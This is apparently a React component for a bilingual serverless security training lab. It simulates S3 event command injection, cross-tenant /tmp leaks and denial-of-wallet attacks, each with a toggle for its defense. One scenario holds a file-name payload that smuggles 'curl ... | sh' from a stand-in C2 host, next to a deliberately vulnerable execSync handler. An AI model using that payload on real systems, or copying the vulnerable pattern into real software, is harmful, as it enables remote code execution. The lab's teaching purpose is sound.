import React, { useState, useMemo } from 'react';
import {
  Cloud,
  Shield,
  ShieldAlert,
  ShieldCheck,
  Zap,
  Terminal,
  Activity,
  Cpu,
  Layers,
  Play,
  RefreshCw,
  Lock,
  Unlock,
  AlertTriangle,
  Server,
  DollarSign,
} from 'lucide-react';

interface ServerlessSecurityLabProps {
  language?: 'ar' | 'en';
}

interface ServerlessScenario {
  id: string;
  nameEn: string;
  nameAr: string;
  category: 'EVENT_INJECTION' | 'WARM_STATE_LEAK' | 'DENIAL_OF_WALLET';
  eventTriggerPayload: string;
  lambdaHandlerSnippet: string;
  descriptionEn: string;
  descriptionAr: string;
  isThreat: boolean;
}

const SERVERLESS_SCENARIOS: ServerlessScenario[] = [
  {
    id: 'SRV-01',
    nameEn: 'S3 Event Data Command Injection',
    nameAr: 'حقن الأوامر عبر أحداث معالجة ملفات S3',
    category: 'EVENT_INJECTION',
    eventTriggerPayload: '{"Records":[{"s3":{"object":{"key":"invoice.pdf; curl https://c2.org/rev.sh | sh"}}}]}',
    lambdaHandlerSnippet: `exports.handler = async (event) => {
    const key = event.Records[0].s3.object.key;
    // VULNERABLE: Child process execution without sanitization!
    execSync("convert /tmp/" + key + " /tmp/out.png");
};`,
    descriptionEn: 'Untrusted user file name passed directly to shell exec inside Lambda microVM, executing arbitrary reverse shell.',
    descriptionAr: 'تمرير اسم الملف المرفوع مباشرة لأمر الشيل داخل دالة Lambda المؤقتة مما يتيح تشغيل أوامر خبيثة.',
    isThreat: true,
  },
  {
    id: 'SRV-02',
    nameEn: 'Warm MicroVM /tmp State Reuse Credential Leak',
    nameAr: 'تسريب المفاتيح المخزنة في /tmp عبر استبقاء حاوية Cold/Warm',
    category: 'WARM_STATE_LEAK',
    eventTriggerPayload: '{"action": "read_debug_cache", "inspect_path": "/tmp"}',
    lambdaHandlerSnippet: `// Lambda Global Scope persistent between warm invocations
let cachedAwsSessionToken = process.env.AWS_SESSION_TOKEN;
// Stolen /tmp/user_credentials_tenant_A.json exposed to Tenant B`,
    descriptionEn: 'MicroVM container reuse across invocations allows second user to inspect unpurged /tmp files from previous customer.',
    descriptionAr: 'إعادة استخدام نفس حاوية الدالة السحابية بين الاستدعاءات يمكن المستأجر الثاني من قراءة ملفات المستأجر الأول في /tmp.',
    isThreat: true,
  },
  {
    id: 'SRV-03',
    nameEn: 'Denial of Wallet (DoW) Concurrency Exhaustion',
    nameAr: 'هجوم استنزاف الميزانية وتفجير الفاتورة (Denial of Wallet)',
    category: 'DENIAL_OF_WALLET',
    eventTriggerPayload: 'HTTP POST /api/heavy-ai-render (10,000 asynchronous concurrent requests sent via botnet)',
    lambdaHandlerSnippet: `// 10,000 Lambda microVMs spin up concurrently
// Account Concurrency Limit (1,000) exhausted
// Estimated Cloud Run Bill: $4,850 in 15 minutes!`,
    descriptionEn: 'Botnet sends 10,000 concurrent requests, locking out legitimate traffic and exploding serverless cloud invoices.',
    descriptionAr: 'شبكة بوتات ترسل 10 آلاف طلب متزامن مما يستنزف سقف الحساب السحابي ويفجر فاتورة الدفع بالاستخدام.',
    isThreat: true,
  },
];

export const ServerlessSecurityLab: React.FC<ServerlessSecurityLabProps> = ({ language = 'en' }) => {
  const isAr = language === 'ar';

  const [selectedScenarioId, setSelectedScenarioId] = useState<string>('SRV-01');
  const [isInvoking, setIsInvoking] = useState<boolean>(false);
  const [lambdaLog, setLambdaLog] = useState<{
    status: 'SERVERLESS_SECURED' | 'SERVERLESS_COMPROMISED';
    runtimeOutput: string;
    actionDetails: string;
    activeDefenses: string[];
  } | null>(null);

  // Serverless Defenses
  const [defenseInputSanitization, setDefenseInputSanitization] = useState<boolean>(false);
  const [defenseTmpDiskPurge, setDefenseTmpDiskPurge] = useState<boolean>(false);
  const [defenseReservedConcurrencyLimit, setDefenseReservedConcurrencyLimit] = useState<boolean>(false);

  const scenario = useMemo(
    () => SERVERLESS_SCENARIOS.find((s) => s.id === selectedScenarioId) || SERVERLESS_SCENARIOS[0],
    [selectedScenarioId]
  );

  const handleInvokeLambda = () => {
    setIsInvoking(true);
    setLambdaLog(null);

    setTimeout(() => {
      const activeDefenses: string[] = [];
      let isBlocked = false;

      if (scenario.category === 'EVENT_INJECTION' && defenseInputSanitization) {
        activeDefenses.push('Strict Event Payload Whitelist & Safe execFile API (No Shell Interpolation)');
        isBlocked = true;
      } else if (scenario.category === 'WARM_STATE_LEAK' && defenseTmpDiskPurge) {
        activeDefenses.push('Ephemeral Container Isolation & Mandatory Pre-Invoke /tmp In-Memory Wipe');
        isBlocked = true;
      } else if (scenario.category === 'DENIAL_OF_WALLET' && defenseReservedConcurrencyLimit) {
        activeDefenses.push('Reserved Concurrency Cap (50 Max) & API Gateway WAF Token-Bucket Rate Limiter');
        isBlocked = true;
      }

      if (isBlocked) {
        setLambdaLog({
          status: 'SERVERLESS_SECURED',
          runtimeOutput: isAr
            ? '[تم حماية الدالة السحابية بدون خادم] تم اعتراض المدخلات الخبيثة أو تحديد سقف استهلاك الموارد بنجاح.'
            : '[SERVERLESS FUNCTION SECURED] Input sanitized or concurrency rate-limited safely at API Gateway.',
          actionDetails: isAr ? 'لا يوجد أي تسريب أو إنفاق مالي غير مصرح به.' : 'MicroVM protected from command injection and Denial-of-Wallet invoice spikes.',
          activeDefenses,
        });
      } else {
        setLambdaLog({
          status: 'SERVERLESS_COMPROMISED',
          runtimeOutput: isAr
            ? `[تم اختراق الدالة السحابية!] استجابة التنفيذ: ${scenario.eventTriggerPayload}`
            : `[MICROVM BREACHED]: Shell command executed or DoW concurrency cap exhausted: ${scenario.eventTriggerPayload}`,
          actionDetails: isAr
            ? 'تحذير: تم تنفيذ أوامر في بيئة الدالة أو تسريب بيانات الجلسات السابقة!'
            : 'CRITICAL SERVERLESS EXPLOIT: Shell injection or concurrent billing spike achieved!',
          activeDefenses: [],
        });
      }

      setIsInvoking(false);
    }, 400);
  };

  return (
    <div className="flex-1 flex flex-col h-full bg-slate-950 text-slate-100 overflow-y-auto p-4 space-y-4 font-mono select-none">
      {/* Header Banner */}
      <div className="bg-slate-900 border border-slate-800 rounded-lg p-4 flex flex-col md:flex-row md:items-center justify-between gap-4">
        <div className="flex items-center gap-3">
          <div className="p-2.5 bg-cyan-500/10 border border-cyan-500/30 rounded-lg text-cyan-400">
            <Cloud className="w-6 h-6" />
          </div>
          <div>
            <h2 className="text-lg font-bold text-slate-100 flex items-center gap-2">
              {isAr ? 'مختبر أمان الحوسبة بدون خادم والدوال السحابية (Serverless & Lambda Security)' : 'Serverless Function & MicroVM Security Laboratory'}
              <span className="px-2 py-0.5 text-[10px] text-cyan-400 bg-cyan-950/60 border border-cyan-800 rounded-full font-mono">
                AWS Lambda / Cloud Functions
              </span>
            </h2>
            <p className="text-xs text-slate-400 mt-0.5">
              {isAr
                ? 'محاكاة تفاعلية لحقن أوامر أحداث S3، وتسريب بيانات الذاكرة /tmp بين الجلسات، واستنزاف الفواتير DoW.'
                : 'Interactive Event-data command injection, /tmp state reuse leaks, and Denial-of-Wallet mitigations.'}
            </p>
          </div>
        </div>

        <div className="flex items-center gap-2 text-xs text-slate-400">
          <span>{isAr ? 'حالة بيئة الدالة:' : 'Lambda MicroVM State:'}</span>
          <span className="px-2 py-1 bg-cyan-950 border border-cyan-800 text-cyan-300 rounded font-bold">
            FIRECRACKER ISOLATION
          </span>
        </div>
      </div>

      {/* Main Grid: Attack Vector Selection + Lambda Code Inspector */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-4 flex-1">
        {/* Left Column: Attack Vector Selector + Defenses */}
        <div className="lg:col-span-5 bg-slate-900/80 border border-slate-800 rounded-lg p-4 flex flex-col space-y-3">
          <h3 className="text-sm font-bold text-slate-200 flex items-center gap-2 uppercase tracking-wider">
            <Zap className="w-4 h-4 text-amber-400" />
            {isAr ? 'سيناريوهات اختراق الدوال السحابية' : 'Serverless Threat Vectors'}
          </h3>

          <div className="space-y-2 overflow-y-auto max-h-[320px] pr-1">
            {SERVERLESS_SCENARIOS.map((sc) => {
              const isSelected = sc.id === selectedScenarioId;
              return (
                <button
                  key={sc.id}
                  onClick={() => setSelectedScenarioId(sc.id)}
                  className={`w-full text-left p-3 rounded-lg border text-xs transition-all flex flex-col space-y-1.5 ${
                    isSelected
                      ? 'bg-cyan-950/50 border-cyan-500 text-slate-100 shadow-md shadow-cyan-950/40'
                      : 'bg-slate-950/60 border-slate-800/80 text-slate-400 hover:border-slate-700 hover:text-slate-200'
                  }`}
                >
                  <div className="flex items-center justify-between">
                    <span className="font-bold text-cyan-300">{sc.id}</span>
                    <span className="px-1.5 py-0.5 text-[9px] bg-slate-900 border border-slate-800 text-slate-300 rounded font-semibold">
                      {sc.category}
                    </span>
                  </div>
                  <span className="font-semibold text-slate-200">{isAr ? sc.nameAr : sc.nameEn}</span>
                  <p className="text-[11px] text-slate-400 line-clamp-2 leading-relaxed">
                    {isAr ? sc.descriptionAr : sc.descriptionEn}
                  </p>
                </button>
              );
            })}
          </div>

          {/* Serverless Defenses */}
          <div className="pt-3 border-t border-slate-800 space-y-2">
            <h4 className="text-xs font-bold text-emerald-400 flex items-center gap-2 uppercase tracking-wider">
              <Shield className="w-4 h-4 text-emerald-400" />
              {isAr ? 'دروع تحصين بيئة الحوسبة بدون خادم' : 'Serverless Security Controls'}
            </h4>

            <div className="space-y-2 text-xs">
              <label className="flex items-center justify-between p-2 bg-slate-950 border border-slate-800 rounded cursor-pointer hover:border-slate-700">
                <span className="text-slate-300">{isAr ? 'تدقيق مدخلات الأحداث واستخدام execFile الآمن' : 'Event Sanitization & Safe execFile API'}</span>
                <input
                  type="checkbox"
                  checked={defenseInputSanitization}
                  onChange={(e) => setDefenseInputSanitization(e.target.checked)}
                  className="rounded border-slate-700 bg-slate-900 text-cyan-500 focus:ring-0"
                />
              </label>

              <label className="flex items-center justify-between p-2 bg-slate-950 border border-slate-800 rounded cursor-pointer hover:border-slate-700">
                <span className="text-slate-300">{isAr ? 'مسح قرص /tmp المؤقت قبل كل استدعاء' : 'Pre-Invoke Ephemeral /tmp Disk Wipe'}</span>
                <input
                  type="checkbox"
                  checked={defenseTmpDiskPurge}
                  onChange={(e) => setDefenseTmpDiskPurge(e.target.checked)}
                  className="rounded border-slate-700 bg-slate-900 text-cyan-500 focus:ring-0"
                />
              </label>

              <label className="flex items-center justify-between p-2 bg-slate-950 border border-slate-800 rounded cursor-pointer hover:border-slate-700">
                <span className="text-slate-300">{isAr ? 'تحديد سقف التزامن للوقاية من تضخم الفاتورة' : 'Reserved Concurrency Cap (DoW Shield)'}</span>
                <input
                  type="checkbox"
                  checked={defenseReservedConcurrencyLimit}
                  onChange={(e) => setDefenseReservedConcurrencyLimit(e.target.checked)}
                  className="rounded border-slate-700 bg-slate-900 text-cyan-500 focus:ring-0"
                />
              </label>
            </div>
          </div>
        </div>

        {/* Right Column: Lambda Handler & Invocation Screen */}
        <div className="lg:col-span-7 bg-slate-900/80 border border-slate-800 rounded-lg p-4 flex flex-col space-y-4">
          <div className="flex items-center justify-between border-b border-slate-800 pb-2">
            <h3 className="text-sm font-bold text-slate-200 flex items-center gap-2">
              <Terminal className="w-4 h-4 text-cyan-400" />
              {isAr ? 'شاشة كود الدالة السحابية وبيانات الحدث' : 'Lambda Handler & Event Inspector'}
            </h3>
            <button
              onClick={handleInvokeLambda}
              disabled={isInvoking}
              className="px-4 py-1.5 bg-cyan-600 hover:bg-cyan-500 text-white rounded text-xs font-bold transition-all flex items-center gap-2 shadow border border-cyan-400/30 disabled:opacity-50"
            >
              {isInvoking ? <RefreshCw className="w-3.5 h-3.5 animate-spin" /> : <Play className="w-3.5 h-3.5 fill-current" />}
              {isAr ? 'استدعاء الدالة السحابية' : 'Invoke Lambda Function'}
            </button>
          </div>

          <div className="bg-slate-950 border border-slate-800 rounded p-3 text-xs font-mono space-y-1">
            <span className="text-slate-400 font-bold block">{isAr ? 'حمولة الحدث المستلمة (Event Trigger JSON):' : 'Triggering Event Payload:'}</span>
            <pre className="p-2 bg-slate-900 border border-slate-800 text-amber-300 rounded text-[11px] overflow-x-auto max-h-[80px]">
              {scenario.eventTriggerPayload}
            </pre>
          </div>

          <div className="bg-slate-950 border border-slate-800 rounded p-3 text-xs font-mono space-y-1">
            <span className="text-slate-400 font-bold block">{isAr ? 'شفرة دالة Lambda البرمجية:' : 'Lambda Handler Code:'}</span>
            <pre className="p-2 bg-slate-900 border border-slate-800 text-cyan-300 rounded text-[11px] overflow-x-auto max-h-[100px]">
              {scenario.lambdaHandlerSnippet}
            </pre>
          </div>

          {/* Invocation Output Log */}
          <div className="flex-1 bg-slate-950 border border-slate-800 rounded-lg p-4 flex flex-col space-y-3 min-h-[160px]">
            <div className="flex items-center justify-between border-b border-slate-800/80 pb-2 text-xs">
              <span className="font-bold text-slate-300">{isAr ? 'سجل تشغيل بيئة Firecracker MicroVM' : 'Firecracker MicroVM Execution Stream'}</span>
            </div>

            {lambdaLog ? (
              <div className="space-y-3 text-xs font-mono">
                <div
                  className={`p-3 rounded border ${
                    lambdaLog.status === 'SERVERLESS_SECURED'
                      ? 'bg-emerald-950/40 border-emerald-800 text-emerald-300'
                      : 'bg-rose-950/50 border-rose-800 text-rose-200'
                  }`}
                >
                  <div className="font-bold mb-1 flex items-center gap-2">
                    {lambdaLog.status === 'SERVERLESS_SECURED' ? (
                      <>
                        <ShieldCheck className="w-4 h-4 text-emerald-400" />
                        <span>{isAr ? 'تم تأمين الدالة السحابية بنجاح' : 'LAMBDA EXECUTION HARDENED'}</span>
                      </>
                    ) : (
                      <>
                        <ShieldAlert className="w-4 h-4 text-rose-400" />
                        <span>{isAr ? 'إنذار: تم استغلال الدالة السحابية!' : 'MICROVM EXPLOITED'}</span>
                      </>
                    )}
                  </div>
                  {lambdaLog.runtimeOutput}
                </div>

                <div className="p-2.5 bg-slate-900 border border-slate-800 text-slate-300 rounded text-[11px]">
                  {lambdaLog.actionDetails}
                </div>
              </div>
            ) : (
              <div className="flex-1 flex flex-col items-center justify-center text-slate-500 space-y-2 py-8">
                <Cpu className="w-8 h-8 text-slate-600 animate-pulse" />
                <p className="text-xs">
                  {isAr
                    ? 'اختر سيناريو وانقر على "استدعاء الدالة السحابية" لمعاينة استجابة بيئة Firecracker MicroVM.'
                    : 'Select a serverless scenario and click "Invoke Lambda Function".'}
                </p>
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  );
};
